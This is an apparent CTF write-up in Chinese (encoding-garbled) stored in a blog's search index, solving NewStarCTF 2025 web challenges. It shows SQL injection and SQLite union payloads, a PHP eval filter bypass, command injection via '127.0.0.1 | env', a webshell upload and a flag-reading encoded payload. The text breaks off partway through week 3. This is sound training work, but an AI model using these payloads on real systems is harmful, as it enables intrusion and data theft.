<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025NewStarCTF</title>
    <link href="/2025/10/28/2025NewStarCTF/"/>
    <url>/2025/10/28/2025NewStarCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="multi-headach3"><a href="#multi-headach3" class="headerlink" title="multi-headach3"></a>multi-headach3</h3><p>å…ˆè®¿é—®robots.txtï¼Œå‘ç°â€œDisallow: &#x2F;hidden.phpâ€</p><p>è®¿é—®&#x2F;hidden.phpï¼Œflagåœ¨å“åº”å¤´ä¸­</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/mh.png"></p><h3 id="strange-login"><a href="#strange-login" class="headerlink" title="strange_login"></a>strange_login</h3><p>ç”¨æˆ·å<code>1&#39;  or 1=1#</code>ï¼Œå¯†ç éšä¾¿ï¼ŒæˆåŠŸç™»å½•å³æ˜¯flag</p><h3 id="é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰"><a href="#é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰" class="headerlink" title="é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰"></a>é»‘å®¢å°Wçš„æ•…äº‹ï¼ˆ1ï¼‰</h3><ul><li>&#x2F;huntï¼šbpæŠ“åŒ…ï¼Œæ”¹countçš„å€¼</li></ul><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/xiaow1_1.png"></p><ul><li>&#x2F;talkToMushroom</li></ul><p>getä¼ shipin&#x3D;mogubaoziï¼Œpostä¼ mogubaozi&#x3D;gudingï¼Œå¾—åˆ°æç¤ºâ€œ[â€œå“¦ï¼Œä½ æ˜¯è¯´éª¨é’‰å—ï¼Ÿâ€, â€œè¿™ä¸ªéª¨é’‰æˆ‘æœ‰å¤§ç”¨ï¼Œä½ å¾—å¸®æˆ‘ç‚¹å¿™â€, â€œè¿™æ ·å§ï¼Œä½ ç”¨ DELETE çš„æ–¹æ³•æŠŠæˆ‘èº«ä¸Šçš„è™«å­(chongzi)éƒ½å¼„æ‰ï¼Œæˆ‘å°±æŠŠéª¨é’‰ç»™ä½ â€];â€</p><p>ç”¨bpå°†è¯·æ±‚æ–¹æ³•æ”¹ä¸ºDELETEï¼Œå¹¶ä¼ å…¥å‚æ•°chongzi</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/xiaow1_2.png"></p><p>å†é‡å¤ç¬¬ä¸€æ­¥ä¼ å‚ï¼Œå¾—åˆ°æç¤ºâ€œ[â€œä½ å·²ç»å¸®æˆ‘æŠŠè™«å­å¼„æ‰äº†ï¼Œæˆ‘æŠŠéª¨é’‰ç»™ä½ å§ï¼Œä½ å¯ä»¥å›å»æ‰¾é‚£ä¸ªå¤§å®¶ä¼™äº†ï¼ˆ&#x2F;Level2_ENDï¼‰â€];â€</p><ul><li>&#x2F;Level2_END</li></ul><p>hackbaræ”¹uaå¤´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CycloneSlash</span>/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">143</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> DashSlash/<span class="hljs-number">143</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><ul><li>&#x2F;Level4_Sly</li></ul><p>ç›´æ¥å°±æœ‰flag</p><h3 id="å®‡å®™çš„ä¸­å¿ƒæ˜¯php"><a href="#å®‡å®™çš„ä¸­å¿ƒæ˜¯php" class="headerlink" title="å®‡å®™çš„ä¸­å¿ƒæ˜¯php"></a>å®‡å®™çš„ä¸­å¿ƒæ˜¯php</h3><p>æµè§ˆå™¨æ›´å¤šå·¥å…·ä¸­æŸ¥çœ‹é¡µé¢æºç </p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/php.png"></p><ul><li>&#x2F;s3kret.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newstar2025&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$answer</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newstar2025&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$answer</span>)!=<span class="hljs-number">47</span>&amp;&amp;<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$answer</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">47</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ä½ è¿˜æœªå‚é€å¥¥ç§˜&quot;</span>;<br>    &#125;<br>&#125; <br></code></pre></td></tr></table></figure><blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">å¦‚æœ <span class="hljs-keyword">base</span> å‚æ•°æ˜¯ <span class="hljs-number">0</span>ï¼Œintval() ä¼šæ ¹æ® <span class="hljs-keyword">value</span> çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ã€‚ä¾‹å¦‚ï¼Œå¦‚æœå­—ç¬¦ä¸²åŒ…å« <span class="hljs-string">&quot;0x&quot;</span> å‰ç¼€ï¼Œåˆ™ä½¿ç”¨ <span class="hljs-number">16</span> è¿›åˆ¶ï¼›å¦‚æœå­—ç¬¦ä¸²ä»¥ <span class="hljs-string">&quot;0&quot;</span> å¼€å¤´ï¼Œåˆ™ä½¿ç”¨ <span class="hljs-number">8</span> è¿›åˆ¶ï¼›å¦åˆ™ï¼Œé»˜è®¤ä½¿ç”¨ <span class="hljs-number">10</span> è¿›åˆ¶ã€‚<br></code></pre></td></tr></table></figure></blockquote><p>postä¼ 0x2fæˆ–057éƒ½è¡Œ</p><h3 id="æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†"><a href="#æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†" class="headerlink" title="æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†"></a>æˆ‘çœŸå¾—æ§åˆ¶ä½ äº†</h3><p>æµè§ˆå™¨æ›´å¤šå·¥å…·æŸ¥çœ‹é¡µé¢æºç ï¼Œå‘ç°ä¸€ä¸ªformè¡¨å•</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/form.png"></p><p>hackbar</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/form2.png"></p><p>bpçˆ†ä¸€ä¸‹å¯†ç ï¼Œå‘ç°ä¸€ä¸ªé•¿åº¦ä¸ä¸€æ ·çš„è¯·æ±‚</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/form3.png"></p><p>ç”¨æˆ·åadminï¼Œå¯†ç 111111ç™»å½•æˆåŠŸ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">generate_dynamic_flag</span>(<span class="hljs-params"><span class="hljs-variable">$secret</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;ICQ_FLAG&quot;</span>) ?: <span class="hljs-string">&#x27;default_flag&#x27;</span>;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;newstar&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$input</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;newstar&#x27;</span>];<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;æ­å–œæŒæ¡æ–°å§¿åŠ¿&quot;</span>);<br>    &#125;<br>    <br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^\d*\/~()\s]/&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è€å¥—è·¯äº†ï¼Œè¡Œä¸è¡Œå•Š&quot;</span>);<br>    &#125;<br>    <br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[\d\s]+$/&#x27;</span>, <span class="hljs-variable">$input</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥æœ‰æ•ˆçš„è¡¨è¾¾å¼&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-variable">$test</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;\$test = <span class="hljs-subst">$input</span>;&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Error</span> <span class="hljs-variable">$e</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¡¨è¾¾å¼é”™è¯¯&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$test</span> == <span class="hljs-number">2025</span>) &#123;<br>        <span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">generate_dynamic_flag</span>(<span class="hljs-variable">$flag_secret</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;success&#x27;&gt;æ‹¿ä¸‹flagï¼&lt;/div&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: <span class="hljs-subst">&#123;$flag&#125;</span>&lt;/div&gt;&lt;/div&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;div class=&#x27;error&#x27;&gt;å¤§å“¥å“¥æ³¥æŠŠæ•°å­—ç®—é”™äº†: <span class="hljs-subst">$test</span> â‰  2025&lt;/div&gt;&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªpreg_match()åªå…è®¸åŒ…å«æ•°å­—ã€*ã€&#x2F;ã€~ã€(ã€)ã€ç©ºç™½å­—ç¬¦</p><p>ç¬¬äºŒä¸ªpreg_match()ä¸å…è®¸åªåŒ…å«æ•°å­—å’Œç©ºç™½å­—ç¬¦</p><p>ç„¶åä¼šå°è¯•æ‰§è¡Œè¾“å…¥çš„è¡¨è¾¾å¼ï¼Œæœ€ç»ˆå¦‚æœ$testçš„å€¼ç­‰äº2025ï¼Œåˆ™å¯ä»¥æ‹¿åˆ°flag</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">payload: <span class="hljs-attribute">newstar</span>=~(~2025)<br></code></pre></td></tr></table></figure><h3 id="åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³"><a href="#åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³" class="headerlink" title="åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³"></a>åˆ«ç¬‘ï¼Œä½ ä¹Ÿè¿‡ä¸äº†ç¬¬äºŒå…³</h3><p>ç›´æ¥æ§åˆ¶å°ä¿®æ”¹åˆ†æ•°</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/game1.png"></p><h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="DDåŠ é€Ÿå™¨"><a href="#DDåŠ é€Ÿå™¨" class="headerlink" title="DDåŠ é€Ÿå™¨"></a>DDåŠ é€Ÿå™¨</h3><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> | env<br></code></pre></td></tr></table></figure><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/dd.png"></p><h3 id="ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰"><a href="#ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰" class="headerlink" title="ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰"></a>ç™½å¸½å°Kçš„æ•…äº‹ï¼ˆ1ï¼‰</h3><p>å‰ç«¯æ£€æµ‹ï¼Œä¸Šä¼ ä¸€ä¸ª<code>.mp3</code>æ–‡ä»¶ï¼ŒbpæŠ“åŒ…ï¼Œæ”¹ä¸ºä¸€å¥è¯æœ¨é©¬</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/xiaok1.png"></p><p>ctrl+uæŸ¥çœ‹æºç ï¼Œå‘ç°ä¸€ä¸ªæ¥å£åº”è¯¥æ˜¯ç”¨æ¥è¿›è¡Œæ–‡ä»¶åŠ è½½çš„</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/xiaok2.png"></p><p>&#x2F;v1&#x2F;onloadç›´æ¥rce</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/xiaok3.png"></p><h3 id="æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜"><a href="#æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜" class="headerlink" title="æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜"></a>æç‚¹å“¦æ¶¦å‰åƒåƒæ©˜</h3><p>è„šæœ¬ç›´æ¥æ¢­äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><br>BASE_URL = <span class="hljs-string">&quot;https://eci-2zec9jzeyoxo8ixyk6k7.cloudeci1.ichunqiu.com:5000/&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_challenge</span>():<br>    session = requests.Session()<br>    <br>    <span class="hljs-comment"># è®¾ç½®è¯·æ±‚å¤´é¿å…æµè§ˆå™¨æ£€æµ‹</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/json, text/plain, */*&#x27;</span><br>    &#125;<br>    session.headers.update(headers)<br>    <br>    <span class="hljs-comment"># ç™»å½•</span><br>    login_data = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;Doro&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;Doro_nJlPVs_@123&quot;</span><br>    &#125;<br>    session.post(BASE_URL + <span class="hljs-string">&#x27;/login&#x27;</span>, data=login_data, verify=<span class="hljs-literal">False</span>)<br>    <br>    <span class="hljs-comment"># å¼€å§‹æŒ‘æˆ˜è·å–è¡¨è¾¾å¼</span><br>    challenge_resp = session.post(BASE_URL + <span class="hljs-string">&#x27;/start_challenge&#x27;</span>, json=&#123;&#125;, verify=<span class="hljs-literal">False</span>)<br>    data = challenge_resp.json()<br>    <br>    <span class="hljs-comment"># è§£æè¡¨è¾¾å¼è·å–å‚æ•°</span><br>    expression = data[<span class="hljs-string">&#x27;expression&#x27;</span>]<br>    <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\((\d+) \* (\d+)\) \^ (0x[0-9a-fA-F]+)&#x27;</span>, expression)<br>    <br>    timestamp = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br>    multiplier = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>))<br>    xor_value = <span class="hljs-built_in">int</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">3</span>), <span class="hljs-number">16</span>)  <span class="hljs-comment"># 16è¿›åˆ¶è½¬10è¿›åˆ¶</span><br>    <br>    <span class="hljs-comment"># è®¡ç®—token</span><br>    token = (timestamp * multiplier) ^ xor_value<br>    <br>    <span class="hljs-comment"># æäº¤éªŒè¯</span><br>    verify_data = &#123;<span class="hljs-string">&quot;token&quot;</span>: token&#125;<br>    verify_resp = session.post(BASE_URL + <span class="hljs-string">&#x27;/verify_token&#x27;</span>, json=verify_data, verify=<span class="hljs-literal">False</span>)<br>    result = verify_resp.json()<br>    <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ‰ Flag: <span class="hljs-subst">&#123;result[<span class="hljs-string">&#x27;flag&#x27;</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;éªŒè¯å¤±è´¥: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solve_challenge()<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹å›¾</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/orange.png"></p><h3 id="å°Eçš„ç®¡ç†ç³»ç»Ÿ"><a href="#å°Eçš„ç®¡ç†ç³»ç»Ÿ" class="headerlink" title="å°Eçš„ç®¡ç†ç³»ç»Ÿ"></a>å°Eçš„ç®¡ç†ç³»ç»Ÿ</h3><p>è¿‡æ»¤äº†ç©ºæ ¼å’Œé€—å·</p><p>ç©ºæ ¼ç”¨<code>%0a</code>ä»£æ›¿ï¼Œé€—å·é‡‡ç”¨joinç»•è¿‡</p><p>sqliteæ³¨å…¥</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">1</span><span class="hljs-variable">%0</span>aorder<span class="hljs-variable">%0</span>aby<span class="hljs-variable">%0</span>a<span class="hljs-number">5</span># åˆ¤æ–­åˆ—æ•°ä¸º<span class="hljs-number">5</span><br><br><span class="hljs-number">1</span><span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a*<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">1</span>)a<span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">2</span>)b<span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">3</span>)<span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">4</span>)d<span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">5</span>)e# æŸ¥è¡¨çš„ä¿¡æ¯<br><br><span class="hljs-number">1</span><span class="hljs-variable">%0</span>aunion<span class="hljs-variable">%0</span>aselect<span class="hljs-variable">%0</span>a*<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">1</span>)a<span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>a<span class="hljs-number">2</span>)b<span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>agroup_concat(id)<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>asys_config)<span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>agroup_concat(config_key)<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>asys_config)d<span class="hljs-variable">%0</span>ajoin<span class="hljs-variable">%0</span>a(<span class="hljs-keyword">select</span><span class="hljs-variable">%0</span>agroup_concat(config_value)<span class="hljs-variable">%0</span>afrom<span class="hljs-variable">%0</span>asys_config)e# æ‹¿flag<br></code></pre></td></tr></table></figure><p>æ‹¿flagå¦‚å›¾</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/xiaoe.png"></p><h3 id="çœŸçš„æ˜¯ç­¾åˆ°è¯¶"><a href="#çœŸçš„æ˜¯ç­¾åˆ°è¯¶" class="headerlink" title="çœŸçš„æ˜¯ç­¾åˆ°è¯¶"></a>çœŸçš„æ˜¯ç­¾åˆ°è¯¶</h3><p>å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†ä¸€äº›åŠ è§£å¯†å’Œå­—ç¬¦æ›¿æ¢æ“ä½œï¼Œatbase()çš„åŠ å¯†å’Œè§£å¯†æ˜¾ç„¶æ˜¯å¯é€†çš„ï¼Œå†™ä¸€ä¸ªé€†åŠ å¯†è„šæœ¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">atbash</span>(<span class="hljs-params"><span class="hljs-variable">$text</span></span>) </span>&#123;<br>  <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$text</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$char</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$char</span>)) &#123;<br>      <span class="hljs-variable">$is_upper</span> = <span class="hljs-title function_ invoke__">ctype_upper</span>(<span class="hljs-variable">$char</span>);<br>      <span class="hljs-variable">$base</span> = <span class="hljs-variable">$is_upper</span> ? <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) : <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>      <span class="hljs-variable">$offset</span> = <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$char</span>)) - <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br>      <span class="hljs-variable">$new_char</span> = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$base</span> + (<span class="hljs-number">25</span> - <span class="hljs-variable">$offset</span>));<br>      <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$new_char</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$char</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;readfile(&quot;/flag&quot;);&#x27;</span>;<br><br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">str_rot13</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">atbash</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$cmd</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment"># dmltamhlYmkoIi9oYm1nIik7</span><br></code></pre></td></tr></table></figure><p>hackbar</p><p><img src="C:/Users/35342/Desktop/note/images/2025NewStarCTF/qiandaoai.png"></p><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="ez-chain"><a href="#ez-chain" class="headerlink" title="ez-chain"></a>ez-chain</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 